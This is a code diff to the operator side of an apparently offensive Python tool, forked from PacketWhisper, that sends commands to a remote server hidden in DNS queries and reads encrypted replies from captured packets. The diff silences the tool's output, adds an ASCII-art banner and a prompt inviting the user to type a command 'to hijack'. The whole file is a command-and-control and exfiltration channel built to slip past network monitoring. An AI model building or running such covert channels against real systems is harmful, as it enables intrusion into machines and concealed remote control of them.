@@ -33,16 +33,16 @@ def send_command(command):
     with open(cloaked_command, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
-            subprocess.call(['nslookup', fqdn_str])
+            subprocess.call(['nslookup', fqdn_str], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     # Rimuove il file dopo l'invio per evitare invii ripetuti
     os.remove(cloaked_command)
 
 
 def receive_response():
-    print("Capturing pcap...")
-    subprocess.call(['python', 'pcapCapture.py']) 
-    print("pcap collected...")
+    #print("Capturing pcap...")
+    subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
+    #print("pcap collected...")
     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
     cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
 
@@ -56,7 +56,7 @@ def receive_response():
             return
         
     # Decloakificare il comando
-    print("Decloakifying...")
+    #print("Decloakifying...")
     if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
         print("Requesting re-trasmission")
         send_command('rt')
@@ -67,7 +67,7 @@ def receive_response():
         encrypted_response = file.read().strip()
     #print("encrypted_response: ", encrypted_response)
     response = decrypt_message(encrypted_response, key)
-    print('Received response: ',response)
+    print(f'\n {response}')
     if response=='rt':
         send_command(command)
     
@@ -79,9 +79,58 @@ def receive_response():
 
 
 if __name__ == "__main__":
-    subprocess.Popen(['python', 'dns_server.py'])
+    ascii_art = """
+            I@Y                  ~$o                   o$             
+          "o@@@@Bf^          ,x$@@@@@@#)`          IC@@@@@m           
+        'h@@Wi>b@@@@@@Mo*$@@@@@@h-  (M@@@@@@BooW@@@@@@Q:|$@@J         
+       m@@@}      ;z#@@@@@$b/`          ,na@@@@@@hf`      v@@@v       
+     0@@@v                                                  b@@@[     
+   t@@@Y   #@@@BJ,    <h@@@X.   @@_   j@M m@@@@@@@t @@@@@@    b@@$>   
+ [B@@w     #@. i@@+ `$@Y` +M@C  @@_   f@M    p@Y    @@|        `#@@M, 
+r@@$'      #@. i@@l W@j    ,@@< @@_   f@M    m@c    @@z_-<       [@@@+
+ -@@k      #@@@@f   @@[     @@+ @@_   f@M    m@c    @@ammY       B@$  
+  X@@C     #@. t@$  >@@-   m@h  w@w   k@x    m@c    @@{         o@@i  
+   a@$.    #@.  /@W'  Z$@@@o]    r$@@@W[     m@c    @@@@@@~    l@@Q   
+   j@@)                                                        b@@i   
+   !@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
+   `@@#                                                       `@@o    
+   ^@@*                                                       '@@*    
+   >@@Z                                                        @@@    
+   r@@}                                                        p@@<   
+   b@$.                                                        i@@J   
+  +@@k                                                          M@B   
+  a@$                                                           /@@m  
+ t@@Y                                                            d@@^ 
+'@@B                                        <>                   >@@B 
+1@@/               1@$CCw@@f  c@@@!  m@n ]@MxfOO                  m@@l
+p@@I               1@#    o@( c@|$@< m@n Z@a                      ]@@t
+$@@                1@#    X@d c@(.@@ m@n  (@@@o<                  !@@Y
+B@@.               1@#    h@/ c@| "@@o@n     ;@@                  i@@X
+0@@>               {@Wl>Q@@r  c@|  :@@@n bz;:X@*                  |@@1
+i@@m               '///|-     >f^    |/   }rnf,                   B@@'
+ Z@@X                                                            d@@- 
+  k@@a                                                          M@@n  
+   f@@@/                                                      Q@@$~   
+     m@@@d;                                                _#@@$n     
+       j@@@@@MdX)`                                  I/CkB@@@@B-       
+          >O@@@@@@@@@B#w|                   `xbM$@@@@@@@@$c:          
+                  -0oW@@@@@@@$c.      ;O@@@@@@@$Mozi                  
+                         "(Q#@@@@@zw@@@@@hY]                          
+                               i0@@@$v,                               
+                                  x:     
+
+    ~ Loris Simonetti a.k.a HeroS3c
+    Forked from: PacketWhisper                             
+
+    see -h for help
+
+    """
+    
+    print(ascii_art)
+    print("Type a command to hijack below:")
+    subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     while True:
-        command = input("Inserisci il comando da eseguire sul server: ")
+        command = input("> ")
         send_command(command)
         try:
             receive_response() 
